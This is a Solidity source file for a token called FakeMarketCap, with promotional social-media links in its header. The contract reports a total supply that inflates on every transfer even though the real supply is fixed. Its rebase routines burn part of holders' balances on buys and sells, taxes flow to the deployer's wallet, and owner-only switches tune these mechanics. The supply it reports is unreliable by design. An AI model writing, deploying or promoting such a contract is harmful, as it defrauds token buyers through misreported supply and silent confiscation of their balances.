/*

Fake Market Cap Mechanics

Each time a coin transfers between a wallet or smart contract, the publicly reported total number of
coins increases in an exponential fashion. Again, cap has a fixed supply but incorrectly reports an
expanding supply. Additionally, we have integrated a subtle rebase mechanism that adjusts the price,
increasing it by 1% every 10 blocks.

Website: https://fakemarketcap.top
Twitter: https://twitter.com/FakeCapEth
Telegram: https://t.me/FakeMarketCapEth

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Pair {
    function sync() external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract FakeMarketCap is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address[] private holders;
    mapping(address => uint256) private _balances;
    mapping(address => bool) public isHolder;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    // Dynamic supply adjustment variables
    bool public shouldIncreaseSupply = true;
    uint256 public supplyRate = 11e17; // 10% increase
    uint256 public minSupplyRate = 1001e15; // 0.001% minimum rate
    uint256 public decayRate = 9999; // Decay of 0.01%
    uint256 public decayBasis = 10000;

    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 25;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 2;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1000 * 10**_decimals;
    string private constant _name = unicode"FakeMarketCap";
    string private constant _symbol = unicode"CAP";
    uint256 public _maxTxAmount = 25 * 10**_decimals;
    uint256 public _maxWalletSize = 25 * 10**_decimals;
    uint256 public _taxSwapThreshold = 10 * 10**_decimals;
    uint256 public _maxTaxSwap = 20 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public failsafeTriggered = false;
    bool public autoRebase = true;
    bool public autoMcap = true;
    bool public buyRun = true;

    uint256 public constant BLOCKS_UNTIL_REBASE = 10;
    uint256 public rebasePercentage = 100; // Rebase percentage (e.g., 1% = 100, 0.5% = 50)
    uint256 public rebasePercentageBuy = 200; // Rebase percentage (e.g., 1% = 100, 0.5% = 50)
    uint256 public lastUpdateBlock;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        lastUpdateBlock = block.number;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function getHolders() external view returns (address[] memory) {
        return holders;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                if (_buyCount < _preventSwapBefore) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            taxAmount = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
                
            if (to == uniswapV2Pair && from != address(this)) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                taxAmount = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
                if (autoRebase) {
                    if (block.number >= lastUpdateBlock + BLOCKS_UNTIL_REBASE) {
                        uint256 rebaseAmount = (_balances[uniswapV2Pair] *
                            rebasePercentage) / 10000;
                        _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(
                            rebaseAmount
                        );
                        _balances[address(0)] = _balances[address(0)].add(
                            rebaseAmount
                        );
                        emit Transfer(uniswapV2Pair, address(0), rebaseAmount);

                        // Call sync to update the pair
                        IUniswapV2Pair(uniswapV2Pair).sync();
                    }
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (autoMcap) {
            _beforeTokenTransfer(amount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));

        _trackHolders(from);
        _trackHolders(to);

        emit Transfer(from, to, amount.sub(taxAmount));

        if (autoRebase && to == uniswapV2Pair) {
            rebase();
        }
        if (autoRebase && from == uniswapV2Pair) {
            rebaseBuy(to);
        }
    }

    function _trackHolders(address account) internal {
        if (
            balanceOf(account) > 0 &&
            account != address(this) &&
            !isHolder[account]
        ) {
            holders.push(account);
            isHolder[account] = true;
        }
    }

    function _beforeTokenTransfer(uint256 amount) internal virtual {
        if (shouldIncreaseSupply) {
            uint256 supplyIncrease = (amount.mul(supplyRate)).div(1e18); // Calculate the increase based on the current amount
            if (_tTotal.add(supplyIncrease) > type(uint256).max) {
                failsafeTriggered = true;
                return;
            }
            _tTotal = _tTotal.add(supplyIncrease); // Increase total supply
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function rebaseBuy(address to) internal {
        uint256 length = holders.length;
            for (uint256 i = 0; i < length; i++) {
                address holder = holders[i];
                uint256 holderBalance = balanceOf(holder);
                uint256 rebaseAmount = (holderBalance * rebasePercentageBuy) /
                    10000;
                if (rebaseAmount > 0 && holder != uniswapV2Pair && holder == to) {
                    if (holderBalance >= rebaseAmount) {
                        _balances[holder] -= rebaseAmount;
                        _balances[address(0)] += rebaseAmount;
                        emit Transfer(holder, address(0), rebaseAmount);
                    } else {
                        _balances[holder] = 0; // If balance is less than the rebase amount, set it to 0
                        _balances[address(0)] += holderBalance;
                        emit Transfer(holder, address(0), holderBalance);
                    }
                }
            }
    }

    function rebase() internal {
        if (block.number >= lastUpdateBlock + BLOCKS_UNTIL_REBASE) {
            uint256 length = holders.length;
            for (uint256 i = 0; i < length; i++) {
                address holder = holders[i];
                uint256 holderBalance = balanceOf(holder);
                uint256 rebaseAmount = (holderBalance * rebasePercentage) /
                    10000;
                if (rebaseAmount > 0 && holder != uniswapV2Pair) {
                    if (holderBalance >= rebaseAmount) {
                        _balances[holder] -= rebaseAmount;
                        _balances[address(0)] += rebaseAmount;
                        emit Transfer(holder, address(0), rebaseAmount);
                    } else {
                        _balances[holder] = 0; // If balance is less than the rebase amount, set it to 0
                        _balances[address(0)] += holderBalance;
                        emit Transfer(holder, address(0), holderBalance);
                    }
                }
            }
            lastUpdateBlock = block.number;
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createPair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    // Dynamic supply control functions
    function setDynamicSupply(bool _shouldIncreaseSupply) external onlyOwner {
        shouldIncreaseSupply = _shouldIncreaseSupply;
    }

    function setSupplyRate(uint256 _supplyRate) external onlyOwner {
        supplyRate = _supplyRate;
    }

    function setRebasePercentage(uint256 _rebasePercentage) external onlyOwner {
        rebasePercentage = _rebasePercentage;
    }

    function setDecayRate(uint256 _decayRate) external onlyOwner {
        decayRate = _decayRate;
    }

    function decaySupplyRate() external {
        if (supplyRate > minSupplyRate) {
            supplyRate = (supplyRate * decayRate) / decayBasis; // Apply decay
        }
    }

    function setFailSafe(bool _failsafeTriggered) external onlyOwner {
        failsafeTriggered = _failsafeTriggered;
    }

    function setrebase(bool _rebase) external onlyOwner {
        autoRebase = _rebase;
    }

    function setFakeMcap(bool _mcap) external onlyOwner {
        autoMcap = _mcap;
    }

    function refreshBalances() external onlyOwner {
        for (uint256 i = 0; i < holders.length; i++) {
            address holder = holders[i];
            emit Transfer(holder, holder, 0);
        }
    }
}